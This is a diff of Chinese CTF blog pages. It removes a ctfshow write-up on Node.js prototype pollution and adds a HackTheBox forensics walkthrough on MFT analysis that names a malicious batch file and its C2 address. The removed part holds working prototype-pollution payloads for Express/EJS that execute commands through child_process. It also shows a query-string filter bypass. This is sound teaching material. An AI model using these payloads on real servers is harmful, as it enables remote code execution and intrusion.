-        &#34;ctfshow&#34;: &#34;36dboy&#34;
-    }
-}</code>
-  </pre>
-  </div>
-<h3 id="2">2 <a href="#2" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
-
-
-  
-  
-  
-
   
+    <img src="https://gitee.com/inklong/blog-pic/raw/master/images/20250601150647.png" alt="" loading="lazy">
   
-  
-  
-
-  
-
-  <div class="prism-codeblock ">
-  <pre id="d151b51" class="language-js ">
-  <code>router.post(&#39;/&#39;, require(&#39;body-parser&#39;).json(),function(req, res, next) {
-
-  res.type(&#39;html&#39;);
-
-  res.render(&#39;api&#39;, { query: Function(query)(query)});
-
-});</code>
-  </pre>
-  </div>
-<blockquote>
-<p>因为所有变量的最顶层是<code>object</code>，所以若当前上下文不存在<code>query</code>，会自动向上查找<code>object</code>的<code>query</code>属性，故可以进行原型链污染</p></blockquote>
-
-
-
-  
-  
-  
+</p>
+<h1 id="task3">Task3 <a href="#task3" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1><blockquote>
+<p>执行恶意代码并连接到 C2 服务器的恶意文件的完整路径和名称是什么？</p>
+<p><code>C:\Users\simon.stark\Downloads\Stage-20240213T093324Z-001\Stage\invoice\invoices\invoice.bat</code></p></blockquote>
+<p>可以直接R-Studio找到第一题压缩包解压出来的bat文件</p>
+<p>
 
-  
-  
-  
-  
-
-  
-
-  <div class="prism-codeblock ">
-  <pre id="6423de2" class="language-json ">
-  <code>{&#34;username&#34;:&#34;admin&#34;,&#34;password&#34;:&#34;admin&#34;,&#34;__proto__&#34;:{&#34;query&#34;:&#34;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;id&#39;)&#34;}}</code>
-  </pre>
-  </div>
-<h3 id="3">3 <a href="#3" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
 
 
-  
-  
-  
 
   
-  
-  
-  
-
+    <img src="https://gitee.com/inklong/blog-pic/raw/master/images/20250601150605.png" alt="" loading="lazy">
   
+</p>
+<p>或者csv接着翻也能看见</p>
+<p>
 
-  <div class="prism-codeblock ">
-  <pre id="39261a8" class="language-js ">
-  <code>router.post(&#39;/&#39;, require(&#39;body-parser&#39;).json(),function(req, res, next) {
 
-  res.type(&#39;html&#39;);
 
-  var flag=&#39;flag_here&#39;;
 
-  var user = new function(){
-
-    this.userinfo = new function(){
-
-    this.isVIP = false;
-
-    this.isAdmin = false;
-
-    this.isAuthor = false;    
-
-    };
-
-  }
-
-  utils.copy(user.userinfo,req.body);
-
-  if(user.userinfo.isAdmin){
-
-   res.end(flag);
-
-  }else{
-
-   return res.json({ret_code: 2, ret_msg: &#39;登录失败&#39;});  
-
-  }</code>
-  </pre>
-  </div>
-<p><code>user.__proto__</code>不是<code>Object</code>，是<code>f()</code>。<code>user.__proto__.__proto__</code>才是，所以需要污染两层。</p>
-
-
-
-  
-  
-  
-
-  
-  
   
+    <img src="https://gitee.com/inklong/blog-pic/raw/master/images/20250601150640.png" alt="" loading="lazy">
   
+</p>
+<p>接着搜invoice，得到答案</p>
+<p>
 
-  
 
-  <div class="prism-codeblock ">
-  <pre id="e2e5db6" class="language-json ">
-  <code>{
-    &#34;__proto__&#34;: {
-        &#34;__proto__&#34;: {
-            &#34;query&#34;: &#34;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;id&#39;)&#34;
-        }
-    }
-}</code>
-  </pre>
-  </div>
-<h3 id="4">4 <a href="#4" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
 
-
-  
-  
-  
 
-  
-  
   
+    <img src="https://gitee.com/inklong/blog-pic/raw/master/images/20250601150696.png" alt="" loading="lazy">
   
+</p>
+<h1 id="task4">Task4 <a href="#task4" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1><blockquote>
+<p>分析先前识别文件中$Created0x30 时间戳。该文件是何时被创建在磁盘上的？</p>
+<p>2024-02-13 16:38:39</p></blockquote>
+<p>这次只能看csv了，bat文件的时间戳</p>
+<p>
 
-  
-
-  <div class="prism-codeblock ">
-  <pre id="caf3ee3" class="language-js ">
-  <code>router.get(&#39;/&#39;, function(req, res, next) {
-
-  res.type(&#39;html&#39;);
 
-  res.render(&#39;index&#39;);
 
-});</code>
-  </pre>
-  </div>
-<p>ejs rce</p>
-
-
-
-  
-  
-  
 
-  
   
+    <img src="https://gitee.com/inklong/blog-pic/raw/master/images/HTB/Sherlock/pic/20250601150663.png" alt="" loading="lazy">
   
-  
-
-  
+</p>
+<h1 id="task5">Task5 <a href="#task5" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1><blockquote>
+<p>在许多调查场景中，找到 MFT 记录的十六进制偏移量非常有用。请找出问题 3 中所述暂存器文件的十六进制偏移量。</p>
+<p>16E3000</p></blockquote>
+<p>条目编号乘1024即可，R-Studio也能看，右键get-info看MFT-number</p>
+<p>23436 * 1024 = 0x16E3000</p>
+<p>
 
-  <div class="prism-codeblock ">
-  <pre id="f71d411" class="language-json ">
-  <code>{&#34;__proto__&#34;:{&#34;__proto__&#34;:{&#34;outputFunctionName&#34;:&#34;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;id&#39;);var __tmp2&#34;}}}</code>
-  </pre>
-  </div>
-<h1 id="get绕过">get绕过 <a href="#get%e7%bb%95%e8%bf%87" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1>
 
 
-  
-  
-  
 
-  
   
+    <img src="https://gitee.com/inklong/blog-pic/raw/master/images/20250601150663%201.png" alt="" loading="lazy">
   
-  
-
-  
-
-  <div class="prism-codeblock ">
-  <pre id="08e92d1" class="language-js ">
-  <code>router.get(&#39;/&#39;, function(req, res, next) {
-  res.type(&#39;html&#39;);
-  var flag = &#39;flag_here&#39;;
-  if(req.url.match(/8c|2c|\,/ig)){
-  	res.end(&#39;where is flag :)&#39;);
-  }
-  var query = JSON.parse(req.query.query);
-  if(query.name===&#39;admin&#39;&amp;&amp;query.password===&#39;ctfshow&#39;&amp;&amp;query.isVIP===true){
-  	res.end(flag);
-  }else{
-  	res.end(&#39;where is flag. :)&#39;);
-  }
-
-});</code>
-  </pre>
-  </div>
-<p>正常传入</p>
+</p>
+<h1 id="task6">Task6 <a href="#task6" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1><blockquote>
+<p>每个 MFT 记录的大小为 1024 字节。如果磁盘上的文件小于 1024 字节，它们可以直接存储在 MFT 文件本身中。这些被称为 MFT 常驻文件。在 Windows 文件系统调查期间，查找可能驻留在 MFT 中的任何恶意/可疑文件至关重要。通过这种方式，我们可以找到恶意文件/脚本的内容。请找出问题 3 中识别的恶意暂存器的内容，并以 C2 IP 和端口作为答案。</p>
+<p>43.204.110.203:6666</p></blockquote>
+<p>R-Studio能直接还原bat文件然后查看</p>
+<p>正常来说是找到偏移地址16E3000之后使用winhex打开源文件，然后跳转到目标偏移就能看见内容了</p>
+<p>
 
 
 
-  
-  
-  
 
-  
   
+    <img src="https://gitee.com/inklong/blog-pic/raw/master/images/20250601150641.png" alt="" loading="lazy">
   
-  
-
-  
-
-  <div class="prism-codeblock ">
-  <pre id="b85098e" class="language-json ">
-  <code>{
-    &#34;name&#34;: &#34;admin&#34;,
-    &#34;password&#34;: &#34;ctfshow&#34;,
-    &#34;isVIP&#34;: true
-}</code>
-  </pre>
-  </div>
-<p>但过滤了<code>,</code>和<code>/2c</code>，所以即便<code>req.url</code>不进行url解码，也无法传入逗号。
-利用<code>req.query.query</code>的特性：传入的相同get参数会加入一个数组，然后<code>JSON.parse</code>会把数组内的元素拼接在一起。
-也就是传入<code>query={&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true}</code>的话，第一步得到<code>['{&quot;name&quot;:&quot;admin&quot;','&quot;password&quot;:&quot;ctfshow&quot;','&quot;isVIP&quot;:true}']</code>，第二步就是目标json。
-使用%63是防止<code>&quot;</code>编码后的<code>%22</code>和<code>C</code>变为<code>2c</code>被过滤。</p>
+</p>
 
     </div>
 
@@ -1456,12 +570,12 @@ console.log(o3.b)
                                             <div><hr class="doc-hr">
 <div id="doc-nav" class="d-print-none">
 
-	<div class="row flex-xl-nowrap ">
-	<div class="col-sm-6 pt-2 doc-next">
-		<a href="/docs/ctf/%E7%9F%A5%E8%AF%86%E7%82%B9/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
-			<div class="card h-100 my-1">
+	<div class="row flex-xl-nowrap flex-row-reverse">
+	<div class="col-sm-6 pt-2 doc-prev">
+		<a class="ms-auto" href="/docs/htb/%E9%9D%B6%E5%9C%BA/boardlight/">
+			<div class="card h-100 my-1 text-end">
 				<div class="card-body py-2">
-                    <p class="card-title fs-5 fw-semibold lh-base mb-0"><i class="material-icons align-middle">navigate_before</i> Pickle反序列化</p>
+                    <p class="card-title fs-5 fw-semibold lh-base mb-0">BoardLight <i class="material-icons align-middle">navigate_next</i></p>
 					
 				</div>
 			</div>
